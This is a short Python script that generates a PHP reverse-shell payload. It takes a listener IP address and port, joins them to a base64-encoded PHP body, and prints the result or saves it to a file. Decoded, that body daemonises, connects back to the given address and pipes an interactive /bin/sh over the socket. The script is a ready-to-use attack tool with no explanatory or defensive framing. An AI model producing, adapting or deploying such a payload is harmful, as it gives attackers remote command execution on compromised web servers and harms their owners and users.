#!/usr/bin/python3  

import base64
import argparse
import sys

PAYLOAD = "JGNodW5rX3NpemU9MTQwMDskd3JpdGVfYT1udWxsOyRlcnJvcl9hPW51bGw7JHNoZWxsPSd1bmFtZSAtYTt3O2lkOy9iaW4vc2ggLWknOyRkYWVtb249MDskZGVidWc9MDtpZihmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSl7JHBpZD1wY250bF9mb3JrKCk7aWYoJHBpZD09LTEpe3ByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7ZXhpdCgxKTt9aWYoJHBpZCl7ZXhpdCgwKTt9aWYocG9zaXhfc2V0c2lkKCk9PS0xKXtwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTtleGl0KDEpO30kZGFlbW9uPTE7fWVsc2V7cHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7fWNoZGlyKCIvIik7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCRpcCwkcG9ydCwkZXJybm8sJGVycnN0ciwzMCk7aWYoISRzb2NrKXtwcmludGl0KCIkZXJyc3RyKCRlcnJubykiKTtleGl0KDEpO30kZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgwPT5hcnJheSgicGlwZSIsInIiKSwxPT5hcnJheSgicGlwZSIsInciKSwyPT5hcnJheSgicGlwZSIsICJ3IikpOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJGRlc2NyaXB0b3JzcGVjLCRwaXBlcyk7aWYoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSl7cHJpbnRpdCgiRVJST1I6IENhbid0IHNwYXduIHNoZWxsIik7ZXhpdCgxKTt9c3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sMCk7c3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sMCk7c3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sMCk7c3RyZWFtX3NldF9ibG9ja2luZygkc29jaywwKTtwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7d2hpbGUoMSl7aWYoZmVvZigkc29jaykpe3ByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTticmVhazt9aWYoZmVvZigkcGlwZXNbMV0pKXtwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7YnJlYWs7fSRyZWFkX2E9YXJyYXkoJHNvY2ssJHBpcGVzWzFdLCRwaXBlc1syXSk7JG51bV9jaGFuZ2VkX3NvY2tldHM9c3RyZWFtX3NlbGVjdCgkcmVhZF9hLCR3cml0ZV9hLCRlcnJvcl9hLG51bGwpO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKXtpZigkZGVidWcpcHJpbnRpdCgiU09DSyBSRUFEIik7JGlucHV0PWZyZWFkKCRzb2NrLCRjaHVua19zaXplKTtpZigkZGVidWcpcHJpbnRpdCgiU09DSzogJGlucHV0Iik7ZndyaXRlKCRwaXBlc1swXSwkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpe2lmKCRkZWJ1ZylwcmludGl0KCJTVERPVVQgUkVBRCIpOyRpbnB1dD1mcmVhZCgkcGlwZXNbMV0sJGNodW5rX3NpemUpO2lmKCRkZWJ1ZylwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpO2Z3cml0ZSgkc29jaywkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMl0sJHJlYWRfYSkpe2lmKCRkZWJ1ZylwcmludGl0KCJTVERFUlIgUkVBRCIpOyRpbnB1dD1mcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTtpZigkZGVidWcpcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTtmd3JpdGUoJHNvY2ssJGlucHV0KTt9fWZjbG9zZSgkc29jayk7ZmNsb3NlKCRwaXBlc1swXSk7ZmNsb3NlKCRwaXBlc1sxXSk7ZmNsb3NlKCRwaXBlc1syXSk7cHJvY19jbG9zZSgkcHJvY2Vzcyk7ZnVuY3Rpb24gcHJpbnRpdCgkc3RyaW5nKXtpZighJGRhZW1vbikge3ByaW50ICIkc3RyaW5nXG4iO319ID8+Cg=="

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", help="IP Address of Local Listener", required=True)
    parser.add_argument("-p", "--port", help="Port number of Local Listener", type=int, required=True)
    parser.add_argument("-o", "--output", help="Save the generated payload into a file")
    args = parser.parse_args()
    PL = ("<?php set_time_limit(0);$ip='{}';$port={};".format(args.ip, args.port)).encode('ascii')
    PLS = base64.b64encode(PL)
    PLE = PAYLOAD.encode('ascii')
    if args.output:
        file = open(args.output, "w")
        file.write("{}{}".format(base64.b64decode(PLS).decode('ascii'),base64.b64decode(PLE).decode('ascii')).rstrip("\n"))
        print("[+] Payload Stored on \"{}\"".format(args.output))
        file.close()
    else:
        print("{}{}".format(base64.b64decode(PLS).decode('ascii'),base64.b64decode(PLE).decode('ascii')).rstrip("\n"))

if __name__ == "__main__":
    main()
